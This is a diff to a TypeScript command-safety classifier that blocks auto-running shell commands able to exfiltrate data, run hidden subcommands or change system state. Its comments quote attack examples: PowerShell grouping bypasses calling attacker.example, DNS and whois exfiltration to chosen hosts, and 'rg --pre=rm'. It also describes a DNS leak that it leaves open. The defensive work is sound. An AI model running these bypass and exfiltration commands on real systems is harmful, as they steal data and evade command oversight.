@@ -36,11 +36,34 @@ const DANGER_PATTERNS: Array<{ pattern: RegExp; reason: string }> = [
     { pattern: /(?:^|\s)doas(?:\s|$)/, reason: 'Contains privilege escalation (doas)' },
 ];
 
+/**
+ * A grouping bracket outside quotes. PowerShell evaluates `( … )` / `@( … )` in an
+ * argument as a command of its own BEFORE the outer one runs, so
+ * `echo (iwr https://attacker.example/?k=…)` and `Get-ChildItem (Stop-Computer)`
+ * run `iwr` / `Stop-Computer` behind a whitelisted base command — and the base
+ * command is all the whitelist, the single-token blacklist and the egress walk
+ * look at. In POSIX shells an unquoted `(` opens a subshell, which is just as
+ * unsafe. Quoted text is left alone: `grep "foo(" x` and PowerShell's literal
+ * `'(…)'` stay safe (`"$(…)"` is already caught by the `$(` pattern above). A
+ * network-device regex filter such as `| include (a|b)` now asks instead of
+ * auto-running — the safe direction.
+ */
+function hasUnquotedGrouping(line: string): boolean {
+    return /[()]/.test(line.replace(/'[^']*'|"[^"]*"/g, ''));
+}
+
 // ── Dangerous flag rules per command ────────────────────────────────────────
 
 interface FlagRule {
     patterns: RegExp[];
+    /** Extra test for what a regex can't express (e.g. counting arguments). */
+    check?: (segment: string) => boolean;
     reason: string;
+}
+
+/** The words of a segment after its base command that are not flags (`-x`, `--x`, `/x`). */
+function operands(segment: string): string[] {
+    return segment.trim().split(/\s+/).slice(1).filter((t) => !/^[-/]/.test(t));
 }
 
 const DANGEROUS_FLAGS: Record<string, FlagRule[]> = {
@@ -77,6 +100,8 @@ const DANGEROUS_FLAGS: Record<string, FlagRule[]> = {
     // auto-execute. Reject the write verbs; anything else stays fast-path safe.
     ip: [
         { patterns: [/(?:^|\s)(?:add|del|delete|change|replace|flush|set|append|prepend)\b/], reason: 'ip write subcommand' },
+        // `ip netns exec <ns> <cmd>` runs any program; `-b`/`-batch` runs commands from a file.
+        { patterns: [/(?:^|\s)(?:exec|-b|-batch|-force)\b/], reason: 'ip runs another command' },
     ],
     ifconfig: [
         // A bare query (`ifconfig`, `ifconfig eth0`) is safe; any config verb is not.
@@ -90,6 +115,9 @@ const DANGEROUS_FLAGS: Record<string, FlagRule[]> = {
     ],
     netsh: [
         { patterns: [/(?:^|\s)(?:set|add|delete|reset)\b/], reason: 'netsh configuration change' },
+        // `netsh wlan export profile key=clear folder=…` writes every saved Wi-Fi
+        // password to disk; `exec` runs a script; the rest change state.
+        { patterns: [/(?:^|\s)(?:export|import|exec|install|uninstall|flush|renew|connect|disconnect|start|stop)\b/i], reason: 'netsh state change or file write' },
     ],
     sysctl: [
         // `sysctl -w key=val` or `sysctl key=val` writes kernel parameters.
@@ -97,6 +125,72 @@ const DANGEROUS_FLAGS: Record<string, FlagRule[]> = {
     ],
     dmesg: [
         { patterns: [/(?:^|\s)(?:-c|-C|--clear|--read-clear)\b/], reason: 'dmesg ring-buffer clear' },
+    ],
+    // Whitelisted read tools with an option that runs another program or writes a
+    // file. The whitelist note ("redirections are blocked structurally") assumed
+    // they could only print — these options are the exceptions.
+    rg: [
+        // `rg --pre=rm x file` runs `rm file` for every file searched.
+        { patterns: [/(?:^|\s)--(?:pre|hostname-bin)\b/], reason: 'rg runs another program (--pre)' },
+    ],
+    sort: [
+        { patterns: [/(?:^|\s)-[A-Za-z]*o/, /(?:^|\s)--(?:output|compress-program)\b/], reason: 'sort writes a file (-o)' },
+    ],
+    uniq: [
+        // `uniq IN OUT` overwrites OUT.
+        // `-f N` / `-s N` / `-w N` take a value, which is not a file.
+        { patterns: [], check: (seg) => operands(seg.replace(/\s-[fsw]\s+\S+/g, '')).length >= 2, reason: 'uniq writes an output file' },
+    ],
+    tree: [
+        // `-o FILE` writes the listing; `-R` with `-H` writes an index into every directory.
+        { patterns: [/(?:^|\s)-[A-Za-z]*[oR]/, /(?:^|\s)--output\b/], reason: 'tree writes files (-o / -R)' },
+    ],
+    file: [
+        { patterns: [/(?:^|\s)(?:-C|--compile)\b/], reason: 'file writes a compiled magic file (-C)' },
+    ],
+    date: [
+        { patterns: [/(?:^|\s)(?:-s|--set)\b/], reason: 'date sets the system clock' },
+    ],
+    hostname: [
+        // A bare `hostname` / `hostname -I` prints; a name argument or a file sets it.
+        { patterns: [/(?:^|\s)(?:-F|--file|-b|--boot)\b/], check: (seg) => operands(seg).length > 0, reason: 'hostname sets the host name' },
+    ],
+    history: [
+        // `-c`/`-d` erase it; `-w`/`-a` write it to a file; `-r`/`-n` read one in.
+        { patterns: [/(?:^|\s)-[A-Za-z]*[cdwarnps]/], reason: 'history clear or file write' },
+    ],
+    ss: [
+        { patterns: [/(?:^|\s)(?:-[A-Za-z]*K|--kill)\b/], reason: 'ss kills sockets (-K)' },
+    ],
+    ipconfig: [
+        // `/release` cuts the network the session itself runs over.
+        { patterns: [/(?:^|\s)[/-](?:release6?|renew6?|flushdns|registerdns|setclassid6?)\b/i], reason: 'ipconfig changes network state' },
+    ],
+    diagnose: [
+        // FortiOS: `diagnose sys session clear` drops every session, `diagnose sys kill` …
+        { patterns: [/(?:^|\s)(?:clear|kill|killall|reset|reset-\S+|restart|reboot|shutdown|flush|delete|del|purge|format|erase|update|upload|disconnect|stop|start)\b/i], reason: 'diagnose state change' },
+    ],
+    // Lookups sent to a server the command line picks are an exfiltration channel
+    // (`dig @203.0.113.5 <data>.x`). Lookups through the configured resolver still
+    // auto-run: a name such as `<data>.attacker.example` can still leak through
+    // DNS, which no flag rule can close without blocking these tools outright.
+    dig: [
+        { patterns: [/(?:^|\s)@\S/], reason: 'dig asks a server named on the command line (@server)' },
+    ],
+    nslookup: [
+        // `nslookup NAME SERVER` — the second operand is the server to ask.
+        { patterns: [], check: (seg) => operands(seg).length >= 2, reason: 'nslookup asks a server named on the command line' },
+    ],
+    host: [
+        // `host [-t type] NAME SERVER`; `-t`/`-c`/`-W`/`-N`/`-R`/`-m` take a value.
+        { patterns: [], check: (seg) => operands(seg.replace(/\s-[tcWNRm]\s+\S+/g, '')).length >= 2, reason: 'host asks a server named on the command line' },
+    ],
+    ping: [
+        // `ping -p <hex>` (Linux) fills the payload with chosen bytes.
+        { patterns: [/(?:^|\s)-[A-Za-z]*p/], reason: 'ping with a chosen payload (-p)' },
+    ],
+    ping6: [
+        { patterns: [/(?:^|\s)-[A-Za-z]*p/], reason: 'ping with a chosen payload (-p)' },
     ],
 };
 
@@ -173,6 +267,9 @@ const NETWORK_EGRESS_COMMANDS: Set<string> = new Set([
     'nc', 'ncat', 'netcat', 'socat', 'telnet', 'ssh',
     // Scanners
     'nmap', 'masscan', 'zmap',
+    // Sends its argument as free text to any host given by `-h` (and to a
+    // third-party registry otherwise): `whois -h attacker.example -p 80 "<data>"`
+    'whois',
     // Windows living-off-the-land downloaders
     'bitsadmin', 'certutil', 'start-bitstransfer',
     'invoke-webrequest', 'iwr', 'invoke-restmethod', 'irm',
@@ -324,6 +421,9 @@ export function structuralDanger(command: string): StructuralDanger {
                 return { danger: true, reason };
             }
         }
+        if (hasUnquotedGrouping(line)) {
+            return { danger: true, reason: 'Contains a grouping bracket ( ) that can run another command' };
+        }
     }
     return { danger: false, reason: '' };
 }
@@ -468,10 +568,8 @@ function classifySegment(
         const flagRules = DANGEROUS_FLAGS[baseLower];
         if (flagRules) {
             for (const rule of flagRules) {
-                for (const pat of rule.patterns) {
-                    if (pat.test(segment)) {
-                        return { safe: false, reason: rule.reason };
-                    }
+                if (rule.patterns.some((pat) => pat.test(segment)) || rule.check?.(segment)) {
+                    return { safe: false, reason: rule.reason };
                 }
             }
         }
